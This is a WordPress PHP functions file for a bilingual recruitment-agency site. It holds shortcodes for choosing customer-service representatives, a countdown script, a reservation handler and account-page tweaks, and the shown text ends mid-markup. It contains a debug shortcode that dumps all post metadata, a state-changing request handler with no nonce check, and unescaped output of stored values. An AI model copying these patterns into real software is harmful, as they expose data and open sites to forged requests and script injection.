<?php


if( ! defined("ABSPATH") ) {
	exit();
}

add_shortcode("test",'test');


//////////////////// custom test box /////////////////////////



function test()
{
	$query = new WP_Query(array(
		'post_type' => 'supportsupport',
		'post_status' => 'publish',
		'numberposts' => -1,
	));


	while ($query->have_posts()) {
		$query->the_post();
		$post_id = get_the_ID();
		print_r(get_post_meta($post_id));
		echo "<br>";
	}
	echo "okkk";
	wp_reset_query();
}


add_shortcode( 'select-service-cv-final', function() { 

	if( ! isset( $_GET['post_id'] ) && empty( sanitize_text_field( $_GET['post_id'] ) ) ) {
		return "Please select a CV first.";
	} ?>
		<style>
			@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap');
			#select-request {
				margin: 60px 0px;
			}
			#page-header h1 {
				display: none !important;
			}
			#select-request h2, #select-request p {
				font-family: 'Poppins', sans-serif;
				text-align: center;
			}
			#select-request h2{
			    font-size: 36px !important;
			    font-weight: bold;
			    margin-bottom: 20px;
			}
		 	#select-request p {
		 		color: #777;
		 		font-weight: 600;
		 		font-size: 16px;
	 		    width: 900px;
    			margin: 0 auto;
		 	}
		 	.choose-cr {
   				font-family: 'Poppins', sans-serif;
	 		    position: relative;
			    background-color: rgba(0, 161, 154, 0.1254901961);
			    padding: 16px;
			    border-radius: 16px;
			    margin-bottom: 60px;
			    display: flex;
    			flex-wrap: wrap;
    			width: 900px;
   				margin: 0 auto;
			    margin-bottom: 30px;
		 	}
		 	.customerOption.col-md-4.wow.fadeInUp {
			    flex: 0 0 auto;
			    width: 33.33333333%;
			}
			.customerOption .btn span {
		        text-transform: capitalize;
			    font-size: 18px !important;
			    text-align: center;
			    font-weight: 600;
			}
		 	.customerOption {
			    padding: 5px;
			}
			.btn-check {
			    position: absolute;
			    clip: rect(0,0,0,0);
			    pointer-events: none;
			}
			.customerOption .btn {
			    padding: 8px 16px;
			    box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1882352941);
			    box-shadow: none;
			    background-color: #ffffff;
			    display: flex;
			    flex-direction: column;
			    height: 100%;
			    position: relative;
			    transition: all 0.3s ease-in-out;
			    border: 2px solid transparent;
			    border-radius: 16px;
		        padding: 25px;
	            cursor: pointer;
			}
			.customerOption .btn img {
			    height: 50px;
			    min-width: 50px;
			    margin: 0 auto 20px;
			    -o-object-fit: contain;
			    object-fit: contain;
			}
			.defaultBtn {
			    position: relative;
			    display: inline-block;
			    text-align: center;
			    overflow: hidden;
			    z-index: 1;
			    background-color: #1c284e;
			    color: #ffffff;
			    transition: all 0.3s ease-in-out;
			    border-radius: 500px;
			    padding: 8px 16px;
			    border: 1px solid transparent;
		        padding-left: 3rem!important;
			    padding-right: 3rem!important;
			    font-size: 18px;
			}
			.defaultBtn:hover {
		        color: #1c284e !important;
			    border: 1px solid #1c284e !important;
			    background: white;
			}
			.cta-btn {
				margin-bottom: 60px;
				text-align: center;
			}
			.choose-cr .btn-check:active + .btn-outline::after, .choose-cr .btn-check:checked + .btn-outline::after, .choose-cr .btn-outline.active::after, .choose-cr .btn-outline.dropdown-toggle.show::after, .choose-cr .btn-outline:active::after {
			    content: "\2713";
			    position: absolute;
			    font-size: 20px;
			    top: 5px;
			    right: 10px;
			    font-weight: 800;
			    color: #1c284e;
			}
		 	.choose-cr .btn-check:active + .btn-outline, .choose-cr .btn-check:checked + .btn-outline, .choose-cr .btn-outline.active, .choose-cr .btn-outline.dropdown-toggle.show, .choose-cr .btn-outline:active {
			    background-color: #ffffff;
			    color: #1c284e;
			    border: 3px solid #1c284e;
			}
			button.defaultBtn:focus {
			    background: #1c284e;
			}
			.error-00263 {
			    text-align: center;
			    color: red;
			    border: 3px dotted red;
			    padding: 10px;
			    width: 900px;
			    margin: 0 auto;
			    margin-bottom: 20px;
			}
			@media only screen and (max-width: 600px) {
				#select-request p {
			    	width: 100% !important;
				}
				.choose-cr {
				    width: 100% !important;
				}
				.choose-cr .customerOption {
				    width: 100% !important;
				}
			}
		</style>
			<form method="post" action="">
			<div id="select-request">
				<h2>اختر ممثل خدمة العملاء</h2>
				<p>يرجى اختيار أحد ممثلي خدمة العملاء للاستمرار في استكمال العقد وإتمام عملية التوظيف</p>
			</div>

			<div class="choose-cr">
			<?php 
				$query = new WP_Query(array(
					'post_type' => 'supportsupport',
					'post_status' => 'publish',
					'numberposts' => -1,
				));


				while ($query->have_posts()) {
					$query->the_post();
					$post_id = get_the_ID();
					$post_meta = get_post_meta($post_id);
					echo '
					
					<div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
						<input type="radio" class="btn-check" name="staff_name" id="'. $post_id .'" value="' . $post_id .'" required="">
						  <label class="btn btn-outline" for="'. $post_id .'">
							  '.wp_get_attachment_image($post_meta['image'][0]).'
							  <span> '.$post_meta['name-en'][0].'</span>
						  </label>
				  	</div>
					
					';
				}
				wp_reset_query();
		
			?>
				
			</div>
			<?php //if( isset( $_GET['error_code'] ) && ! empty( $_GET['error_code'] ) && '00263' == $_GET['error_code'] ) : ?>
				<!-- <p class="error-00263">Please select a Customer Representative</p> -->
			<?php //endif; ?>
		  	<div class="cta-btn">
		  		<button type="submit" name="submit-service" class="defaultBtn"> يكمل </button>
		  	</div>

	  </form>

	<?php
});



add_shortcode( 'select-service-cv-en-final', function() { 

	if( ! isset( $_GET['post_id'] ) && empty( sanitize_text_field( $_GET['post_id'] ) ) ) {
		return "Please select a CV first.";
	} ?>
		<style>
			@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap');
			#select-request {
				margin: 60px 0px;
			}
			#page-header h1 {
				display: none !important;
			}
			#select-request h2, #select-request p {
				font-family: 'Poppins', sans-serif;
				text-align: center;
			}
			#select-request h2{
			    font-size: 36px !important;
			    font-weight: bold;
			    margin-bottom: 20px;
			}
		 	#select-request p {
		 		color: #777;
		 		font-weight: 600;
		 		font-size: 16px;
	 		    width: 900px;
    			margin: 0 auto;
		 	}
		 	.choose-cr {
   				font-family: 'Poppins', sans-serif;
	 		    position: relative;
			    background-color: rgba(0, 161, 154, 0.1254901961);
			    padding: 16px;
			    border-radius: 16px;
			    margin-bottom: 60px;
			    display: flex;
    			flex-wrap: wrap;
    			width: 900px;
   				margin: 0 auto;
			    margin-bottom: 30px;
		 	}
		 	.customerOption.col-md-4.wow.fadeInUp {
			    flex: 0 0 auto;
			    width: 33.33333333%;
			}
			.customerOption .btn span {
		        text-transform: capitalize;
			    font-size: 18px !important;
			    text-align: center;
			    font-weight: 600;
			}
		 	.customerOption {
			    padding: 5px;
			}
			.btn-check {
			    position: absolute;
			    clip: rect(0,0,0,0);
			    pointer-events: none;
			}
			.customerOption .btn {
			    padding: 8px 16px;
			    box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1882352941);
			    box-shadow: none;
			    background-color: #ffffff;
			    display: flex;
			    flex-direction: column;
			    height: 100%;
			    position: relative;
			    transition: all 0.3s ease-in-out;
			    border: 2px solid transparent;
			    border-radius: 16px;
		        padding: 25px;
	            cursor: pointer;
			}
			.customerOption .btn img {
			    height: 50px;
			    min-width: 50px;
			    margin: 0 auto 20px;
			    -o-object-fit: contain;
			    object-fit: contain;
			}
			.defaultBtn {
			    position: relative;
			    display: inline-block;
			    text-align: center;
			    overflow: hidden;
			    z-index: 1;
			    background-color: #1c284e;
			    color: #ffffff;
			    transition: all 0.3s ease-in-out;
			    border-radius: 500px;
			    padding: 8px 16px;
			    border: 1px solid transparent;
		        padding-left: 3rem!important;
			    padding-right: 3rem!important;
			    font-size: 18px;
			}
			.defaultBtn:hover {
		        color: #1c284e !important;
			    border: 1px solid #1c284e !important;
			    background: white;
			}
			.cta-btn {
				margin-bottom: 60px;
				text-align: center;
			}
			.choose-cr .btn-check:active + .btn-outline::after, .choose-cr .btn-check:checked + .btn-outline::after, .choose-cr .btn-outline.active::after, .choose-cr .btn-outline.dropdown-toggle.show::after, .choose-cr .btn-outline:active::after {
			    content: "\2713";
			    position: absolute;
			    font-size: 20px;
			    top: 5px;
			    right: 10px;
			    font-weight: 800;
			    color: #1c284e;
			}
		 	.choose-cr .btn-check:active + .btn-outline, .choose-cr .btn-check:checked + .btn-outline, .choose-cr .btn-outline.active, .choose-cr .btn-outline.dropdown-toggle.show, .choose-cr .btn-outline:active {
			    background-color: #ffffff;
			    color: #1c284e;
			    border: 3px solid #1c284e;
			}
			button.defaultBtn:focus {
			    background: #1c284e;
			}
			.error-00263 {
			    text-align: center;
			    color: red;
			    border: 3px dotted red;
			    padding: 10px;
			    width: 900px;
			    margin: 0 auto;
			    margin-bottom: 20px;
			}
			@media only screen and (max-width: 600px) {
				#select-request p {
			    	width: 100% !important;
				}
				.choose-cr {
				    width: 100% !important;
				}
				.choose-cr .customerOption {
				    width: 100% !important;
				}
			}
		</style>
			<form method="post" action="">
			<div id="select-request">
				<h2>Choose a customer service representative</h2>
				<p>Please choose one of the customer service representatives to continue to complete the contract and complete the recruitment</p>
			</div>

			<div class="choose-cr">
			<?php 
				$query = new WP_Query(array(
					'post_type' => 'supportsupport',
					'post_status' => 'publish',
					'numberposts' => -1,
				));


				while ($query->have_posts()) {
					$query->the_post();
					$post_id = get_the_ID();
					$post_meta = get_post_meta($post_id);
					echo '
					
					<div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
						<input type="radio" class="btn-check" name="staff_name" id="'. $post_id .'" value="' . $post_id .'" required="">
						  <label class="btn btn-outline" for="'. $post_id .'">
							  '.wp_get_attachment_image($post_meta['image'][0]).'
							  <span> '.$post_meta['name-en'][0].'</span>
						  </label>
				  	</div>
					';
				}
				wp_reset_query();
			?>
			</div>
			<?php //if( isset( $_GET['error_code'] ) && ! empty( $_GET['error_code'] ) && '00263' == $_GET['error_code'] ) : ?>
				<!-- <p class="error-00263">Please select a Customer Representative</p> -->
			<?php //endif; ?>
		  	<div class="cta-btn">
		  		<button type="submit" name="submit-service" class="defaultBtn"> emphasis </button>
		  	</div>

	  </form>

	<?php
});



/////////////////////// End custom post box ///////////////////////////

add_shortcode( 'select-service-cv-en', function() { 

	if( ! isset( $_GET['post_id'] ) && empty( sanitize_text_field( $_GET['post_id'] ) ) ) {
		return "Please select a CV first.";
	} ?>
		<style>
			@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap');
			#select-request {
				margin: 60px 0px;
			}
			#page-header h1 {
				display: none !important;
			}
			#select-request h2, #select-request p {
				font-family: 'Poppins', sans-serif;
				text-align: center;
			}
			#select-request h2{
			    font-size: 36px !important;
			    font-weight: bold;
			    margin-bottom: 20px;
			}
		 	#select-request p {
		 		color: #777;
		 		font-weight: 600;
		 		font-size: 16px;
	 		    width: 900px;
    			margin: 0 auto;
		 	}
		 	.choose-cr {
   				font-family: 'Poppins', sans-serif;
	 		    position: relative;
			    background-color: rgba(0, 161, 154, 0.1254901961);
			    padding: 16px;
			    border-radius: 16px;
			    margin-bottom: 60px;
			    display: flex;
    			flex-wrap: wrap;
    			width: 900px;
   				margin: 0 auto;
			    margin-bottom: 30px;
		 	}
		 	.customerOption.col-md-4.wow.fadeInUp {
			    flex: 0 0 auto;
			    width: 33.33333333%;
			}
			.customerOption .btn span {
		        text-transform: capitalize;
			    font-size: 18px !important;
			    text-align: center;
			    font-weight: 600;
			}
		 	.customerOption {
			    padding: 5px;
			}
			.btn-check {
			    position: absolute;
			    clip: rect(0,0,0,0);
			    pointer-events: none;
			}
			.customerOption .btn {
			    padding: 8px 16px;
			    box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1882352941);
			    box-shadow: none;
			    background-color: #ffffff;
			    display: flex;
			    flex-direction: column;
			    height: 100%;
			    position: relative;
			    transition: all 0.3s ease-in-out;
			    border: 2px solid transparent;
			    border-radius: 16px;
		        padding: 25px;
	            cursor: pointer;
			}
			.customerOption .btn img {
			    height: 50px;
			    min-width: 50px;
			    margin: 0 auto 20px;
			    -o-object-fit: contain;
			    object-fit: contain;
			}
			.defaultBtn {
			    position: relative;
			    display: inline-block;
			    text-align: center;
			    overflow: hidden;
			    z-index: 1;
			    background-color: #1c284e;
			    color: #ffffff;
			    transition: all 0.3s ease-in-out;
			    border-radius: 500px;
			    padding: 8px 16px;
			    border: 1px solid transparent;
		        padding-left: 3rem!important;
			    padding-right: 3rem!important;
			    font-size: 18px;
			}
			.defaultBtn:hover {
		        color: #1c284e !important;
			    border: 1px solid #1c284e !important;
			    background: white;
			}
			.cta-btn {
				margin-bottom: 60px;
				text-align: center;
			}
			.choose-cr .btn-check:active + .btn-outline::after, .choose-cr .btn-check:checked + .btn-outline::after, .choose-cr .btn-outline.active::after, .choose-cr .btn-outline.dropdown-toggle.show::after, .choose-cr .btn-outline:active::after {
			    content: "\2713";
			    position: absolute;
			    font-size: 20px;
			    top: 5px;
			    right: 10px;
			    font-weight: 800;
			    color: #1c284e;
			}
		 	.choose-cr .btn-check:active + .btn-outline, .choose-cr .btn-check:checked + .btn-outline, .choose-cr .btn-outline.active, .choose-cr .btn-outline.dropdown-toggle.show, .choose-cr .btn-outline:active {
			    background-color: #ffffff;
			    color: #1c284e;
			    border: 3px solid #1c284e;
			}
			button.defaultBtn:focus {
			    background: #1c284e;
			}
			.error-00263 {
			    text-align: center;
			    color: red;
			    border: 3px dotted red;
			    padding: 10px;
			    width: 900px;
			    margin: 0 auto;
			    margin-bottom: 20px;
			}
			@media only screen and (max-width: 600px) {
				#select-request p {
			    	width: 100% !important;
				}
				.choose-cr {
				    width: 100% !important;
				}
				.choose-cr .customerOption {
				    width: 100% !important;
				}
			}
		</style>
			<form method="post" action="">
			<div id="select-request">
				<h2>Choose a customer service representative</h2>
				<p>Please choose one of the customer service representatives to continue to complete the contract and complete the recruitment</p>
			</div>

			<div class="choose-cr">
		  		<div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option1" value="001" required="">
				      <label class="btn btn-outline" for="option1">
				          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
				          <span> A. Manar Al-Shammari</span>
				      </label>
				  </div>
			  <div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option2" value="002" required="">
			      <label class="btn btn-outline" for="option2">
			          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
			          <span> A. Asmaa Al-Harbi</span>
			      </label>
			  </div>
			  <div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option3" value="003" required="">
			      <label class="btn btn-outline" for="option3">
			          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
			          <span> A. Amsha Al-Shammari</span>
			      </label>
			  </div>
			  <div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option4" value="004" required="">
			      <label class="btn btn-outline" for="option4">
			          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
			          <span> Ms. Rania Shamsan</span>
			      </label>
			  </div>
			  <div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option5" value="005" required="">
			      <label class="btn btn-outline" for="option5">
			          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
			          <span> A. Shahd Al-Subaie</span>
			      </label>
			  </div>
			  <div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option6" value="006" required="">
			      <label class="btn btn-outline" for="option6">
			          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
			          <span> Mrs. Sahaib Al-Otaibi</span>
			      </label>
			  </div>
			</div>
			<?php //if( isset( $_GET['error_code'] ) && ! empty( $_GET['error_code'] ) && '00263' == $_GET['error_code'] ) : ?>
				<!-- <p class="error-00263">Please select a Customer Representative</p> -->
			<?php //endif; ?>
		  	<div class="cta-btn">
		  		<button type="submit" name="submit-service" class="defaultBtn"> emphasis </button>
		  	</div>

	  </form>

	<?php
});


add_shortcode( 'select-service-cv', function() { 

	if( ! isset( $_GET['post_id'] ) && empty( sanitize_text_field( $_GET['post_id'] ) ) ) {
		return "Please select a CV first.";
	} ?>
		<style>
			@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap');
			#select-request {
				margin: 60px 0px;
			}
			#page-header h1 {
				display: none !important;
			}
			#select-request h2, #select-request p {
				font-family: 'Poppins', sans-serif;
				text-align: center;
			}
			#select-request h2{
			    font-size: 36px !important;
			    font-weight: bold;
			    margin-bottom: 20px;
			}
		 	#select-request p {
		 		color: #777;
		 		font-weight: 600;
		 		font-size: 16px;
	 		    width: 900px;
    			margin: 0 auto;
		 	}
		 	.choose-cr {
   				font-family: 'Poppins', sans-serif;
	 		    position: relative;
			    background-color: rgba(0, 161, 154, 0.1254901961);
			    padding: 16px;
			    border-radius: 16px;
			    margin-bottom: 60px;
			    display: flex;
    			flex-wrap: wrap;
    			width: 900px;
   				margin: 0 auto;
			    margin-bottom: 30px;
		 	}
		 	.customerOption.col-md-4.wow.fadeInUp {
			    flex: 0 0 auto;
			    width: 33.33333333%;
			}
			.customerOption .btn span {
		        text-transform: capitalize;
			    font-size: 18px !important;
			    text-align: center;
			    font-weight: 600;
			}
		 	.customerOption {
			    padding: 5px;
			}
			.btn-check {
			    position: absolute;
			    clip: rect(0,0,0,0);
			    pointer-events: none;
			}
			.customerOption .btn {
			    padding: 8px 16px;
			    box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1882352941);
			    box-shadow: none;
			    background-color: #ffffff;
			    display: flex;
			    flex-direction: column;
			    height: 100%;
			    position: relative;
			    transition: all 0.3s ease-in-out;
			    border: 2px solid transparent;
			    border-radius: 16px;
		        padding: 25px;
	            cursor: pointer;
			}
			.customerOption .btn img {
			    height: 50px;
			    min-width: 50px;
			    margin: 0 auto 20px;
			    -o-object-fit: contain;
			    object-fit: contain;
			}
			.defaultBtn {
			    position: relative;
			    display: inline-block;
			    text-align: center;
			    overflow: hidden;
			    z-index: 1;
			    background-color: #1c284e;
			    color: #ffffff;
			    transition: all 0.3s ease-in-out;
			    border-radius: 500px;
			    padding: 8px 16px;
			    border: 1px solid transparent;
		        padding-left: 3rem!important;
			    padding-right: 3rem!important;
			    font-size: 18px;
			}
			.defaultBtn:hover {
		        color: #1c284e !important;
			    border: 1px solid #1c284e !important;
			    background: white;
			}
			.cta-btn {
				margin-bottom: 60px;
				text-align: center;
			}
			.choose-cr .btn-check:active + .btn-outline::after, .choose-cr .btn-check:checked + .btn-outline::after, .choose-cr .btn-outline.active::after, .choose-cr .btn-outline.dropdown-toggle.show::after, .choose-cr .btn-outline:active::after {
			    content: "\2713";
			    position: absolute;
			    font-size: 20px;
			    top: 5px;
			    right: 10px;
			    font-weight: 800;
			    color: #1c284e;
			}
		 	.choose-cr .btn-check:active + .btn-outline, .choose-cr .btn-check:checked + .btn-outline, .choose-cr .btn-outline.active, .choose-cr .btn-outline.dropdown-toggle.show, .choose-cr .btn-outline:active {
			    background-color: #ffffff;
			    color: #1c284e;
			    border: 3px solid #1c284e;
			}
			button.defaultBtn:focus {
			    background: #1c284e;
			}
			.error-00263 {
			    text-align: center;
			    color: red;
			    border: 3px dotted red;
			    padding: 10px;
			    width: 900px;
			    margin: 0 auto;
			    margin-bottom: 20px;
			}
			@media only screen and (max-width: 600px) {
				#select-request p {
			    	width: 100% !important;
				}
				.choose-cr {
				    width: 100% !important;
				}
				.choose-cr .customerOption {
				    width: 100% !important;
				}
			}
		</style>
			<form method="post" action="">
			<div id="select-request">
				<h2>اختر ممثل خدمة العملاء</h2>
				<p>يرجى اختيار أحد ممثلي خدمة العملاء للاستمرار في استكمال العقد وإتمام عملية التوظيف</p>
			</div>

			<div class="choose-cr">
		  		<div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option1" value="001" required="">
				      <label class="btn btn-outline" for="option1">
				          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
				          <span> أ. منار الشمري</span>
				      </label>
				  </div>
			  <div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option2" value="002" required="">
			      <label class="btn btn-outline" for="option2">
			          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
			          <span> أ. أسماء الحربي</span>
			      </label>
			  </div>
			  <div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option3" value="003" required="">
			      <label class="btn btn-outline" for="option3">
			          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
			          <span> أ. أمشى الشمري</span>
			      </label>
			  </div>
			  <div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option4" value="004" required="">
			      <label class="btn btn-outline" for="option4">
			          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
			          <span> السّيدة. رانيا شمسان</span>
			      </label>
			  </div>
			  <div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option5" value="005" required="">
			      <label class="btn btn-outline" for="option5">
			          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
			          <span> أ. شاهد الصبي</span>
			      </label>
			  </div>
			  <div class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option6" value="006" required="">
			      <label class="btn btn-outline" for="option6">
			          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
			          <span> مرس. صهيب العتيبي</span>
			      </label>
			  </div>
			</div>
			<?php //if( isset( $_GET['error_code'] ) && ! empty( $_GET['error_code'] ) && '00263' == $_GET['error_code'] ) : ?>
				<!-- <p class="error-00263">Please select a Customer Representative</p> -->
			<?php //endif; ?>
		  	<div class="cta-btn">
		  		<button type="submit" name="submit-service" class="defaultBtn"> يكمل </button>
		  	</div>

	  </form>

	<?php
});

add_action( 'wp_footer', function() {
	$time = get_user_meta( get_current_user_id(), 'reservation_time', true ); ?>
		<script>
			jQuery(document).ready(function() {
				jQuery("body").on('click', '#reserveCvButton', function(e) {
				    e.preventDefault();
				    var post_id = jQuery(this).parents('.jet-listing-grid__item').data('post-id');
				    var url = jQuery(this).children('div').children('div').children('a').attr('href');

				    window.location.href = url + "?post_id=" + post_id;
				});
				var countDownDate = new Date( '<?php echo $time; ?>' * 1000 ).getTime();
				var x = setInterval(function() {
				var now = new Date().getTime();
				var distance = countDownDate - now;

				var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
				var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
				var seconds = Math.floor((distance % (1000 * 60)) / 1000);

				document.getElementById("demo").innerHTML = hours + "h " + minutes + "m " + seconds + "s ";
				}, 1000);

			});
		</script>
	<?php
});

add_action( 'init', function() {
		
	if( 
		isset( $_REQUEST['staff_name'], $_REQUEST['post_id'] ) 		&& 
		! empty( sanitize_text_field( $_REQUEST['staff_name'] ) ) 	&& 
		! empty( sanitize_text_field( $_REQUEST['post_id'] ) ) 
	) {
		$post_id 	= sanitize_text_field( $_REQUEST['post_id'] );
		$staff 		= sanitize_text_field( $_REQUEST['staff_name'] );
			
		$str = ( polylang_get_current_language() == 'en' ) ? '/my-account/' : '/%d8%ad%d8%b3%d8%a7%d8%a8%d9%8a/';
		$cv_url = ( polylang_get_current_language() == 'en' ) ? '/select-service-cv-2/' : '/select-service-cv/';

		if( is_user_logged_in() ) {
			update_user_meta( get_current_user_id(), 'recruited_cv', $post_id );	
			update_user_meta( get_current_user_id(), 'recruited_sr', $staff );
			update_user_meta( get_current_user_id(), 'reservation_time', ( current_time( 'timestamp' ) + 10800 ) );
			insert_request_post($post_id, $staff, $post_id);
			update_post_meta($post_id,'available','false');
			wp_redirect( home_url( $str ) );
			exit();

		} else {

			$add_staff_to_url = add_query_arg( 
				array(
					'post_id' 		=> $post_id,
				), home_url( $cv_url ) 
			);

			$temp = add_query_arg( 'redirect_to', $add_staff_to_url, home_url( $str ) );
			wp_redirect( $temp );
			exit;

		}

	}
});

add_filter('woocommerce_account_menu_items', function( $items ) {
	$items['dashboard'] = ( polylang_get_current_language() == 'en' ) ? 'Recruitment Requests' : 'طلبات التوظيف  ';

    unset($items['orders']);
    unset($items['downloads']);
    unset($items['edit-address']);
    unset($items['payment-methods']);

    return $items;
}, 999);

add_action( 'woocommerce_account_content', function() { ?>
	<div class=" userHeader">
	    <div class="userInfo">
	        <div class="d-flex flex-wrap align-items-center">
	            <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avatar.webp" alt="روافد نجد للاستقدام" class="me-3">
	            <div class="userName" style="<?php echo ( polylang_get_current_language() == 'en' ) ? 'margin-left: 15px;' : 'margin-right: 15px;'; ?>">
	                <h3><?php echo get_userdata( get_current_user_id() )->data->user_login; ?></h3>
	                <div> <?php echo get_user_meta( get_current_user_id(), 'billing_phone', true ); ?> </div>
	            </div>
	        </div>
	        <div class="control" style="<?php echo ( polylang_get_current_language() == 'en' ) ? 'right: 0;' : 'left:0;'; ?>">
	            <a href="<?php echo wp_logout_url( home_url() ); ?>" title="تسجبل الخروج ">
	                <i class="fas fa-power-off"></i>
	            </a>
	        </div>
	    </div>
	</div>
	<style>
		.userHeader {
		    margin: 20px 0px;
		    background-color: #ffffff;
		    color: #1c284e;
		    border-radius: 20px;
		    box-shadow: 0px 8px 24px rgba(0, 0, 0, 0.1882352941);
		    padding: 20px;
		}

		.userHeader .userInfo {
		    position: relative;
		    margin: 0px 10px;
		}

		.align-items-center {
		    align-items: center!important;
		}
		.flex-wrap {
		    flex-wrap: wrap!important;
		}
		.d-flex {
		    display: flex!important;
		}
		.userHeader .userInfo img {
		    width: 100px;
		    height: 100px;
		    -o-object-fit: cover;
		    object-fit: cover;
		    -o-object-position: top;
		    object-position: top;
		    border-radius: 100%;
		    border: 3px solid #f5f4de;
		}

		.userHeader .userInfo .userName h3 {
		    font-weight: bold;
		    margin-bottom: 10px;
		}

		.userHeader .userInfo .control {
		    position: absolute;
		    top: 5px;
		}

		.userHeader .userInfo .control i {
		    font-size: 22px;
		    color: #ff0000;
		    cursor: pointer;
		}
		.newOrder {
		    width: 100%;
		    padding: 20px;
		    display: flex;
		    align-items: center;
		    border-radius: 8px;
		    border: 1px solid #1c284e;
		    background: #1c284e;
		    color: #f5f4de;
		    margin-bottom: 20px;
			text-decoration: none !important;
		}
		.newOrder strong {
		    color: white;
		}
		i.fas.fa-file {
		    color: white;
		    font-size: 20px;
		}
		.woocommerce {
		    margin: 70px 0 !important;
		}
		</style>
	<?php
	if( '/%d8%ad%d8%b3%d8%a7%d8%a8%d9%8a/' == $_SERVER['REQUEST_URI'] || '/%d8%ad%d8%b3%d8%a7%d8%a8%d9%8a' == $_SERVER['REQUEST_URI'] || '/en/my-account/' == $_SERVER['REQUEST_URI'] || '/en/my-account/' == $_SERVER['REQUEST_URI'] ) {
		echo "<style>.woocommerce-MyAccount-content p {display: none;}</style>";
		$post_id = get_user_meta( get_current_user_id(), 'recruited_cv', true );
		$cr =  get_user_meta( get_current_user_id(), 'recruited_sr', true );
		$cr = get_post_meta($cr);
		?>

			<a href="https://al-rhal.com/%d8%a7%d8%ae%d8%aa%d9%8a%d8%a7%d8%b1-%d8%a7%d9%84%d8%b9%d9%85%d8%a7%d9%84%d8%a9/" class="newOrder">
                <i class="fas fa-file" style="<?php echo ( polylang_get_current_language() == 'en' ) ? 'margin-right: 10px;' : 'margin-left: 10px;'; ?>"></i>
                <div><strong> تقديم طلب جديد </strong></div>
            </a>
		<?php
		$image = get_post_meta( $post_id, 'gallery', true );
		if( ! empty( $image ) ) {
			$image = explode( ",", $image );
			$temp = reset( $image ); 
			echo "<div style='margin-bottom: 20px !important;'><a style='background: #1c284e; color: white; padding: 7px 12px; border-radius: 5px; text-decoration: none;' href='?remove_listing'>أغلق هذه السيرة الذاتية المحجوزة  </a></div>";
			echo wp_get_attachment_image( $temp, array('700', '500') ); ?>
				<div id="chattytrigger" class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
				      <input type="radio" class="btn-check" name="staff_name" id="option2" value="002" required="">
				      <label class="btn btn-outline" for="option2">
				          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
				          <span><?php if(polylang_get_current_language() == 'ar'){echo $cr['name-ar'][0];}else{echo $cr['name-en'][0];} ?></span>
				      </label>
				      <br />
			      <!-- <i>Click the customer support person button to chat with the customer representative.</i> -->
				  </div>
				  <div class="chatty-cta">
				  	<a class="ha-creative-btn ha-stl--estilo ha-eft--slide-right" href="tel:<?php echo $cr['phone'][0];  ?>" rel="nofollow"><?php if(polylang_get_current_language() == 'ar'){echo "هاتف";}else{echo "phone";} ?></a>
